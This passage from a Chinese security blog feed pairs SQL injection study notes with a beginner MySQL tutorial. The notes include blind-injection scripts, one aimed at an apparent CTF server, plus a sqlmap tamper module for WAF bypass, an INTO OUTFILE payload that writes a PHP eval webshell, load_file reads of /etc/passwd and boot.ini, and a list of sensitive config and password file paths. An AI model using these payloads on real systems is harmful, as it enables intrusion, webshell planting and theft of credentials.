plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;xxxx&quot;flag = &quot;&quot;</span><br><span class="line">s = reuqests.session()　　　　　　#获取会话for i in range(100):　　　　　　 #在bool还是延时注入的时候都要一个个试，假设我们这里不知道目标字段的长度就稍微设置个合适的　　for j in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_-,.&quot;:　　　　#这个是可能的字符，一个个试呗　　　　payload = &quot;xx&#x27; or if((substr(database())=&quot; + str(j) + &quot;,&quot; + str(i) + &quot;,1),1,0) #&quot; 　　　　　　#手工测出来有效的payload，当然实际情况会根据waf变个型　　　　data = &#123;　　　　　　&#x27;username&#x27;:&#x27;payload&#x27;,　　　　　　&#x27;password&#x27;:&#x27;123&#x27;　　　　&#125;　　　　s.post(url,data=data)　　#发送数据　　　　if &quot;right&quot; in s.text ：　　#如果返回值有在sql语句成功后有不同于失败的时候的回显，将该回显当做判定　　　　　　flag += str(j)　　　　　　print flag　　　　　　beak</span><br></pre></td></tr></table></figure><p>那么我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本</p><p>在sqlmap文件夹下的/tamper/下，自己创建个py文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.replace(&quot;&#x27;&quot;,&quot;%1$&#x27;&quot;)　　　　　　#将什么替换成什么</span><br><span class="line">    payload = payload.replace(&quot;u&quot;,&quot;\u0075&quot;)　　　　  #将什么替换成什么，可以写很多个</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>在sqlmap使用的时候调用这个模块，即可使用自定义过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --tamper=模块名.py -u &#x27;http://xxx.xx.xx.xx/ddd.php?id=1&#x27;</span><br></pre></td></tr></table></figure><p><strong>0x04将结果写入文件达到getshell</strong></p><p>写入文件的前提是outfile这个关键字没有被禁止，并且知道web站点的绝对路径</p><p>使用方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27; into outfile &#x27;/var/www/html/sijidou.php&#x27; #</span><br></pre></td></tr></table></figure><p><em><strong>[mysql load_file在数据库注入中使用]</strong></em></p><p>load_file函数只有满足两个条件就可以使用：</p><p>1、文件权限：chmod a+x pathtofile</p><p>2、文件大小: 必须小于max_allowed_packet</p><p>例子：</p><p>select load_file(‘D:\xampp\htdocs\www\wanju\htaccess.txt’)</p><p>select load_file(‘/etc/hosts’)</p><p>例如上面的例子是有条件限制的：</p><p>1、必须有权限读取并且文件必须完全可读。</p><p>  and (select count(*) from mysql.user)&gt;0 /<em>如果结果返回正常，说明具有读写权限.</em>/</p><p>  and (select count(<em>) from mysql.user)&gt;0 /</em> 返回错误，应该是管理员给数据库账户降权了*/</p><p>2、欲读取文件必须在服务器上</p><p>3、必须指定文件完整的路径</p><p>4、欲读取文件必须小于max_allowed_packet</p><p>　　如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。</p><p>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，</p><p>users就不能实现用load_file读取文件了。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>1、绝对物理路径。</p><p>2、构造有效的畸形语句。</p><p> 　在很多PHP程序中，当提交一个错误的查询时，如果display_errors=on，程序就会暴露web目录的绝对路径，只有知道</p><p>路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p><p>利用：</p><p>　　我们假设一个程序的SQL语句如下：</p><p>select * from article where articleid=$id  (当前条件：magic_quotes_gpc = off, c:/boot.ini可读）</p><p>此时，我们构造$id为：</p><p>-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p><p>我们的查询语句就变成：</p><p>select * from article where articleid=-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p><p>程序就会把c:/boot.ini内容老老实实显示出来，但是现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有</p><p>引号的语句呢？</p><p>看过&lt;<SQL Injection with MySQL>&gt;的朋友肯定知道用char()函数或者把字符转换成16进制。</p><p>注：当前条件为magic_quotes_gpc=on, c:/boot.ini可读。</p><p>我们构造$id为：</p><p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p><p>“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII代码。</p><p>我们的查询语句就变成：</p><p>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</p><p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p><p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,所以上面的语句就变成：</p><p>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</p><p>当然，在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用into outfile把文件导出。</p><hr><p>关于mysql into outfile注射，要使用into outfile 把代码写到web目录取得webshell首先需要3大先天条件：</p><p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p><p>2、能够使用union （需要mysql 3以上的版本）</p><p>3、对方没有对(‘)进行过滤（因为outfile后面的（’’)不可以用其他函数代替转换）</p><p>后天条件需要二个：</p><p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p><p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x，也就是</p><p>   说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的。</p><hr><p>mysql的load_file()常见的用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</span><br><span class="line"></span><br><span class="line">2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line"></span><br><span class="line">上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如&quot;&lt;&quot;替换成&quot;空格&quot;,返回的是网页。</span><br><span class="line"></span><br><span class="line">而无法查看到代码。</span><br><span class="line"></span><br><span class="line">3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</span><br><span class="line"></span><br><span class="line">4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache虚拟主机配置文件。</span><br><span class="line"></span><br><span class="line">5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</span><br><span class="line"></span><br><span class="line">　　apache文件。</span><br><span class="line"></span><br><span class="line">6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</span><br><span class="line"></span><br><span class="line">7、/usr/local/resin/conf/resin.cof  查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">8、d:/apache/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">9、c:/Program Files/mysql.my.ini</span><br><span class="line"></span><br><span class="line">10、../themes/darkblue_orange/layout.inc.php  phpmyadmin 爆路径</span><br><span class="line"></span><br><span class="line">11、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">12、/usr/local/resin-3.0.22/conf/resin.conf  或/usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">13、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">14、/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line">15、usr/local/app/php5/lib/php.ini  PHP 的设置</span><br><span class="line"></span><br><span class="line">16、/etc/my.cnf  MYSQL的配置文件</span><br><span class="line"></span><br><span class="line">17、/etc/redhat-release 红帽子的系统版本</span><br><span class="line"></span><br><span class="line">18、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">19、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.</span><br><span class="line"></span><br><span class="line">20、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf  虚拟网站设置</span><br><span class="line"></span><br><span class="line">21、c:/windows/my.ini</span><br></pre></td></tr></table></figure><p><code>Locate()</code><br><code>LOCATE(substr,str) , LOCATE(substr,str,pos) </code><br>第一个语法返回字符串 str中子字符串substr的第一个出现位置。第二个语法返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0。</p><p>这里主要利用第二个语法进行报错注入：</p><p>假设数据库名为security</p><p>首先从最基本的：</p><p><code>locate(‘s’,(select database()),1)</code></p><p>表示查询数据库名，并且是从第一位开始，返回字符s第一次出现的位置。</p><p>但是仅凭这一句是无法获取特别有用的信息的，但是可以在构造</p><p><code>locate(‘s’,(select database()),1)=1</code></p><p>查询数据库名的第一位开始，如果存在s,并且s的位置等于1，那么等式成立。</p><p>综合利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘s’,(select database()),1)=1)</span><br></pre></td></tr></table></figure><p>如果返回值正常，我们就可以认为第一位是s,同理构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure><p>将x遍历，n从1开始增加，即可。</p><p>不过还有个问题：mysql对字段名的大小写是不敏感的，也就是说会同时出现S和s 满足，都会被记录。</p><p>这里可以用binary修饰，表示二进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(binary’X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure><p>附上脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">rs = requests.session()</span><br><span class="line">url0=&quot;http://120.24.86.145:9004/Once_More.php&quot;</span><br><span class="line">def locate():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        char_all = &#x27;!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~&#x27;</span><br><span class="line">        key = 0</span><br><span class="line">        for i in char_all:</span><br><span class="line">            url = url0+&quot;?id=1&#x27;and  (select locate(binary&#x27;&quot; + str(</span><br><span class="line">                i) + &quot;&#x27;,(select database() limit 0,1),&quot; + str(</span><br><span class="line">                j) + &quot;))=&quot; + str(j) + &quot;%23&quot;</span><br><span class="line">            r1 = rs.get(url)</span><br><span class="line">            print (url)</span><br><span class="line">            if &quot;Hello&quot; in r1.text:</span><br><span class="line">                print(str(i) + &quot; -----&quot; + str(j))</span><br><span class="line">                flag += str(i)</span><br><span class="line">                print(&quot;[*] : &quot; + flag)</span><br><span class="line">                key = 1</span><br><span class="line">        if key == 0:</span><br><span class="line">            break</span><br><span class="line">locate()</span><br></pre></td></tr></table></figure><p>参考</p><blockquote></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql学习记录</title>
      <link href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql学习"><a href="#mysql学习" class="headerlink" title="mysql学习"></a>mysql学习</h1><p>基本操作</p><p>自由咒语 <code>rm -f</code></p><p>退出 <code>exit</code></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>命令行连接  <code>mysql -uroot -p</code></p><p>脚本连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据库连接成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227125703585.png" alt="image-20211227125703585"></p><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>使用mysqladmin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p create RUNOOB</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接错误: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;CREATE DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;创建数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227125808680.png" alt="image-20211227125808680"></p><h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><p><code>drop database &lt;数据库名&gt;;</code></p><p>使用mysqladmin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p drop RUNOOB</span><br><span class="line">Enter password:******</span><br><span class="line">Dropping the database is potentially a very bad thing to do.</span><br><span class="line">Any data stored in the database will be destroyed.</span><br><span class="line"></span><br><span class="line">Do you really want to drop the &#x27;RUNOOB&#x27; database [y/N] y</span><br><span class="line">Database &quot;RUNOOB&quot; dropped</span><br></pre></td></tr></table></figure><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;DROP DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;删除数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227130105043.png" alt="image-20211227130105043"></p><h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><p><code>use xxx;</code></p><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&#x27;;</span><br><span class="line">mysqli_select_db($conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>数据类型</p><h4 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h4><p>MySQL 中定义数据字段的类型对你数据库的优化是非常重要的。</p><p>MySQL 支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</p><h5 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h5><p>MySQL 支持所有标准 SQL 数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持 MyISAM、MEMORY、InnoDB 和 BDB表。</p><p>作为 SQL 标准的扩展，MySQL 也支持整数类型 TINYINT、MEDIUMINT 和 BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">范围（有符号）</th><th align="left">范围（无符号）</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">TINYINT</td><td align="left">1 Bytes</td><td align="left">(-128，127)</td><td align="left">(0，255)</td><td align="left">小整数值</td></tr><tr><td align="left">SMALLINT</td><td align="left">2 Bytes</td><td align="left">(-32 768，32 767)</td><td align="left">(0，65 535)</td><td align="left">大整数值</td></tr><tr><td align="left">MEDIUMINT</td><td align="left">3 Bytes</td><td align="left">(-8 388 608，8 388 607)</td><td align="left">(0，16 777 215)</td><td align="left">大整数值</td></tr><tr><td align="left">INT或INTEGER</td><td align="left">4 Bytes</td><td align="left">(-2 147 483 648，2 147 483 647)</td><td align="left">(0，4 294 967 295)</td><td align="left">大整数值</td></tr><tr><td align="left">BIGINT</td><td align="left">8 Bytes</td><td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td align="left">(0，18 446 744 073 709 551 615)</td><td align="left">极大整数值</td></tr><tr><td align="left">FLOAT</td><td align="left">4 Bytes</td><td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td align="left">单精度 浮点数值</td></tr><tr><td align="left">DOUBLE</td><td align="left">8 Bytes</td><td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td align="left">双精度 浮点数值</td></tr><tr><td align="left">DECIMAL</td><td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td align="left">依赖于M和D的值</td><td align="left">依赖于M和D的值</td><td align="left">小数值</td></tr></tbody></table><h5 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h5><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p><p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p><table><thead><tr><th align="left">类型</th><th align="left">大小 ( bytes)</th><th align="left">范围</th><th align="left">格式</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">DATE</td><td align="left">3</td><td align="left">1000-01-01/9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">TIME</td><td align="left">3</td><td align="left">‘-838:59:59’/‘838:59:59’</td><td align="left">HH:MM:SS</td><td align="left">时间值或持续时间</td></tr><tr><td align="left">YEAR</td><td align="left">1</td><td align="left">1901/2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">DATETIME</td><td align="left">8</td><td align="left">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">TIMESTAMP</td><td align="left">4</td><td align="left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td align="left">YYYYMMDD HHMMSS</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h5 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h5><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><table><thead><tr><th align="left">类型</th><th align="left">大小</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">CHAR</td><td align="left">0-255 bytes</td><td align="left">定长字符串</td></tr><tr><td align="left">VARCHAR</td><td align="left">0-65535 bytes</td><td align="left">变长字符串</td></tr><tr><td align="left">TINYBLOB</td><td align="left">0-255 bytes</td><td align="left">不超过 255 个字符的二进制字符串</td></tr><tr><td align="left">TINYTEXT</td><td align="left">0-255 bytes</td><td align="left">短文本字符串</td></tr><tr><td align="left">BLOB</td><td align="left">0-65 535 bytes</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">TEXT</td><td align="left">0-65 535 bytes</td><td align="left">长文本数据</td></tr><tr><td align="left">MEDIUMBLOB</td><td align="left">0-16 777 215 bytes</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">MEDIUMTEXT</td><td align="left">0-16 777 215 bytes</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">LONGBLOB</td><td align="left">0-4 294 967 295 bytes</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="left">LONGTEXT</td><td align="left">0-4 294 967 295 bytes</td><td align="left">极大文本数据</td></tr></tbody></table><p><strong>注意</strong>：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p><p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p><p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p><h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><p>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@host# mysql -u root -p</span><br><span class="line">Enter password:*******</span><br><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; CREATE TABLE runoob_tbl(</span><br><span class="line">   -&gt; runoob_id INT NOT NULL AUTO_INCREMENT,</span><br><span class="line">   -&gt; runoob_title VARCHAR(100) NOT NULL,</span><br><span class="line">   -&gt; runoob_author VARCHAR(40) NOT NULL,</span><br><span class="line">   -&gt; submission_date DATE,</span><br><span class="line">   -&gt; PRIMARY KEY ( runoob_id )</span><br><span class="line">   -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt;</span><br><span class="line">###########</span><br><span class="line">注意：MySQL命令终止符为分号 ; 。</span><br><span class="line">注意： -&gt; 